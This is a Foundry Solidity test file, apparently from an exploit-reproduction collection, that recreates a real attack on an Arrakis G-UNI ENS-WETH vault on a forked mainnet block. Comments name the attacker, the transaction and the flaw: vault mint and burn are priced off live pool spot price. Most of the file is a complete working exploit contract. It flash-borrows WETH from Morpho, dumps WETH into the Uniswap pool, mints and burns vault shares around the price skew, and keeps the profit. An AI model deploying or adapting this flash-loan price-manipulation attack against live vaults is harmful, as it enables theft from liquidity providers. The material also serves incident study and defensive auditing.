// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : 2.94135035290003714 WETH (~$7,170)
// Attacker : 0xa3B096e4df1247794599a37Af8F5b8CB05D5EB44
// Attack Contract : 0x028d9C17B1a097e7e115A6400203df86339BAf4a
// Vulnerable Contract : 0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe (G-UNI ENS-WETH vault proxy)
// Implementation : 0xd68b055fb444d136e3ac4df023f4c42334f06395 (ArrakisVaultV1)
// Attack Tx : https://etherscan.io/tx/0x6ae3af4b2f25a56594de99cfb31369150dd9ac059c49efe04b9e3e0163dbc672
// Block : 25817966 (fork 25817965)

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xd68b055fb444d136e3ac4df023f4c42334f06395#code
// Vault proxy : https://etherscan.io/address/0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe#code
// Uni V3 pool : https://etherscan.io/address/0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3#code

// @Analysis
// Twitter Guy : https://x.com/SlowMist_Team/status/2091738634210996429
// ExVul : https://x.com/exvulsec/status/2091521539585999337
// Arrakis : https://x.com/ArrakisFinance/status/2091743446419575223
//
// ArrakisVaultV1 mint()/burn() value the Uniswap V3 position off live pool.slot0()
// with no same-transaction snapshot and no TWAP on the user path (TWAP only guards
// manager rebalance()). An attacker sandwiches mint and burn around a spot-price
// dump so shares are issued against one composition and redeemed against a richer
// mix of liquidity, accrued fees, and idle balances.

address constant ATTACKER = 0xa3B096e4df1247794599a37Af8F5b8CB05D5EB44;
address constant VAULT = 0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe;
address constant VAULT_IMPL = 0xd68b055fb444D136e3aC4df023f4C42334F06395;
address constant POOL = 0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant ENS_TOKEN = 0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72;
address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;

uint256 constant FORK_BLOCK = 25_817_965;
uint256 constant FLASH_WETH = 1_800 ether;
// Exact WETH sold into Uni V3 in the live attack (pushes spot to MIN tick).
uint256 constant DUMP_WETH = 145_416_963_504_083_295_148;

uint160 constant MIN_SQRT_RATIO = 4_295_128_739;
uint160 constant MAX_SQRT_RATIO = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_342;

interface IArrakisVault {
    function getMintAmounts(uint256 amount0Max, uint256 amount1Max)
        external
        view
        returns (uint256 amount0, uint256 amount1, uint256 mintAmount);

    function mint(uint256 mintAmount, address receiver)
        external
        returns (uint256 amount0, uint256 amount1, uint128 liquidityMinted);

    function burn(uint256 burnAmount, address receiver)
        external
        returns (uint256 amount0, uint256 amount1, uint128 liquidityBurned);

    function getUnderlyingBalances() external view returns (uint256 amount0Current, uint256 amount1Current);

    function totalSupply() external view returns (uint256);
}

interface IUniswapV3Pool {
    function slot0()
        external
        view
        returns (
            uint160 sqrtPriceX96,
            int24 tick,
            uint16 observationIndex,
            uint16 observationCardinality,
            uint16 observationCardinalityNext,
            uint8 feeProtocol,
            bool unlocked
        );

    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

interface IMorpho {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

contract ArrakisFinance_exp is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8545", FORK_BLOCK);
        fundingToken = WETH_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(VAULT, "G-UNI ENS-WETH vault");
        vm.label(VAULT_IMPL, "ArrakisVaultV1");
        vm.label(POOL, "Uni V3 ENS/WETH");
        vm.label(WETH_TOKEN, "WETH");
        vm.label(ENS_TOKEN, "ENS");
        vm.label(MORPHO, "Morpho Blue");
    }

    function testExploit() public balanceLog {
        uint256 vaultWethBefore = IERC20(WETH_TOKEN).balanceOf(VAULT);
        uint256 attackerBefore = IERC20(WETH_TOKEN).balanceOf(ATTACKER);

        ArrakisFinanceExploit exploit = new ArrakisFinanceExploit(ATTACKER);
        vm.prank(ATTACKER);
        exploit.attack();

        uint256 profit = IERC20(WETH_TOKEN).balanceOf(ATTACKER) - attackerBefore;
        emit log_named_decimal_uint("Vault WETH before", vaultWethBefore, 18);
        emit log_named_decimal_uint("Vault WETH after", IERC20(WETH_TOKEN).balanceOf(VAULT), 18);
        emit log_named_decimal_uint("Attacker WETH profit", profit, 18);

        // Live attack netted 2.94135035290003714 WETH (then tipped 0.05 ETH to the builder).
        assertGt(profit, 2.9 ether, "WETH profit too small");
        assertApproxEqAbs(profit, 2.94135035290003714 ether, 0.05 ether, "WETH profit mismatch");
    }
}

contract ArrakisFinanceExploit {
    address private immutable profitReceiver;

    constructor(address profitReceiver_) {
        profitReceiver = profitReceiver_;
    }

    function attack() external {
        require(msg.sender == profitReceiver, "only receiver");

        // step 1: flash-borrow 1,800 WETH from Morpho Blue (zero fee).
        IMorpho(MORPHO).flashLoan(WETH_TOKEN, FLASH_WETH, "");

        // step 7: leftover WETH after repay is the sandwich profit.
        uint256 profit = IERC20(WETH_TOKEN).balanceOf(address(this));
        IERC20(WETH_TOKEN).transfer(profitReceiver, profit);
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == MORPHO, "not morpho");

        IERC20(WETH_TOKEN).approve(VAULT, type(uint256).max);
        IERC20(ENS_TOKEN).approve(VAULT, type(uint256).max);

        // step 2: dump WETH for ENS, pushing Uni V3 spot to the MIN tick.
        _swap(true, int256(uint256(DUMP_WETH)), MIN_SQRT_RATIO + 1);

        // step 3: mint G-UNI shares against the skewed slot0 composition.
        // Keep ~1% of dumped ENS to swap back through the newly minted liquidity.
        uint256 ensBal = IERC20(ENS_TOKEN).balanceOf(address(this));
        uint256 ensRestore = ensBal / 100;
        (,, uint256 mintAmount) =
            IArrakisVault(VAULT).getMintAmounts(IERC20(WETH_TOKEN).balanceOf(address(this)), ensBal - ensRestore);
        IArrakisVault(VAULT).mint(mintAmount, address(this));

        // step 4: swap leftover ENS back, restoring price through the vault range (fees accrue).
        uint256 ensLeftover = IERC20(ENS_TOKEN).balanceOf(address(this));
        _swap(false, int256(ensLeftover), MAX_SQRT_RATIO - 1);

        // step 5: burn shares — pro-rata of restored liquidity, fees, and idle balances.
        IArrakisVault(VAULT).burn(mintAmount, address(this));

        // step 6: convert remaining ENS to WETH and repay Morpho.
        uint256 ensOut = IERC20(ENS_TOKEN).balanceOf(address(this));
        if (ensOut > 0) {
            _swap(false, int256(ensOut), MAX_SQRT_RATIO - 1);
        }
        IERC20(WETH_TOKEN).approve(MORPHO, assets);
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        require(msg.sender == POOL, "not pool");
        if (amount0Delta > 0) {
            IERC20(WETH_TOKEN).transfer(msg.sender, uint256(amount0Delta));
        }
        if (amount1Delta > 0) {
            IERC20(ENS_TOKEN).transfer(msg.sender, uint256(amount1Delta));
        }
    }

    function _swap(bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96) internal {
        IUniswapV3Pool(POOL).swap(address(this), zeroForOne, amountSpecified, sqrtPriceLimitX96, "");
    }
}
